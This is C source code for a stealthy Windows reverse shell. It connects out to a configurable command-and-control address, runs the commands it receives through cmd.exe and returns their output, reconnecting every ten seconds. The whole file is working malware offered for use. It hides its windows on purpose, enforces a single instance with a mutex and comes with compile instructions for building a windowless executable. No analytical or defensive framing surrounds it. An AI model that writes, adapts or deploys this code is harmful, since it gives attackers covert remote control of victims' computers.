/*
 * Persistent Reverse Shell - INVISIBLE + FIXED
 * Compile: gcc persistent_shell.c -o shell.exe -lws2_32 -mwindows -s
 * NOTE: -mwindows flag makes it GUI app (no console window)
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "192.168.1.113"  // CHANGE THIS
#define C2_PORT 4444
#define BUFFER_SIZE 8192
#define RECONNECT_DELAY 10

// Global flag to prevent multiple instances
HANDLE g_hMutex = NULL;

void execute_command(SOCKET sock, char *cmd) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hStdOutRead, hStdOutWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead;
    
    // Setup pipe for output
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        send(sock, "ERROR: CreatePipe failed\nshell> ", 32, 0);
        return;
    }
    
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    
    // Setup process - HIDDEN
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = hStdOutWrite;
    si.hStdOutput = hStdOutWrite;
    si.hStdInput = NULL;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // HIDE THE WINDOW
    
    ZeroMemory(&pi, sizeof(pi));
    
    // Build command
    char full_cmd[BUFFER_SIZE];
    snprintf(full_cmd, BUFFER_SIZE, "cmd.exe /c %s 2>&1", cmd);
    
    // Execute - CREATE_NO_WINDOW flag
    if (!CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE, 
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        send(sock, "ERROR: CreateProcess failed\nshell> ", 35, 0);
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        return;
    }
    
    CloseHandle(hStdOutWrite);
    
    // Wait for completion (with timeout)
    WaitForSingleObject(pi.hProcess, 30000); // 30 second timeout
    
    // Read output
    int total_sent = 0;
    while (ReadFile(hStdOutRead, buffer, BUFFER_SIZE - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        send(sock, buffer, bytesRead, 0);
        total_sent += bytesRead;
    }
    
    // Send prompt only if we sent output
    if (total_sent > 0) {
        send(sock, "\nshell> ", 8, 0);
    } else {
        send(sock, "shell> ", 7, 0);
    }
    
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

SOCKET connect_to_c2() {
    SOCKET sock;
    struct sockaddr_in server;
    
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        return INVALID_SOCKET;
    }
    
    // Set timeouts
    DWORD timeout = 10000; // 10 seconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    // Disable Nagle's algorithm for better responsiveness
    int flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(int));
    
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    server.sin_addr.s_addr = inet_addr(C2_HOST);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    
    return sock;
}

void shell_loop(SOCKET sock) {
    char buffer[BUFFER_SIZE];
    int recv_size;
    fd_set read_fds;
    struct timeval tv;
    
    // Send initial prompt
    send(sock, "shell> ", 7, 0);
    
    while (1) {
        // Use select to check if data is available
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int activity = select(0, &read_fds, NULL, NULL, &tv);
        
        if (activity == SOCKET_ERROR) {
            break; // Socket error
        }
        
        if (activity == 0) {
            continue; // Timeout, loop again
        }
        
        // Data available
        ZeroMemory(buffer, BUFFER_SIZE);
        recv_size = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        
        if (recv_size <= 0) {
            break; // Connection lost
        }
        
        buffer[recv_size] = '\0';
        
        // Remove newline/carriage return
        char *newline = strchr(buffer, '\n');
        if (newline) *newline = '\0';
        newline = strchr(buffer, '\r');
        if (newline) *newline = '\0';
        
        // Trim whitespace
        char *cmd = buffer;
        while (*cmd == ' ' || *cmd == '\t') cmd++;
        
        if (strlen(cmd) == 0) {
            send(sock, "shell> ", 7, 0);
            continue;
        }
        
        // Check for exit command
        if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
            send(sock, "Exiting...\n", 11, 0);
            break;
        }
        
        // Execute command
        execute_command(sock, cmd);
    }
}

// Mutex check to prevent multiple instances
BOOL CheckSingleInstance() {
    g_hMutex = CreateMutexA(NULL, TRUE, "Global\\MyShellMutex_9f8a7b6c");
    
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // Another instance is running
        if (g_hMutex) CloseHandle(g_hMutex);
        return FALSE;
    }
    
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsa;
    SOCKET sock;
    
    // Check for single instance
    if (!CheckSingleInstance()) {
        return 0; // Exit silently if already running
    }
    
    // Hide console window (extra safety)
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }
    
    // Main loop - keep trying to connect
    while (1) {
        sock = connect_to_c2();
        
        if (sock != INVALID_SOCKET) {
            // Connected - run shell
            shell_loop(sock);
            closesocket(sock);
        }
        
        // Wait before reconnecting
        Sleep(RECONNECT_DELAY * 1000);
    }
    
    // Cleanup
    if (g_hMutex) {
        ReleaseMutex(g_hMutex);
        CloseHandle(g_hMutex);
    }
    
    WSACleanup();
    return 0;
}
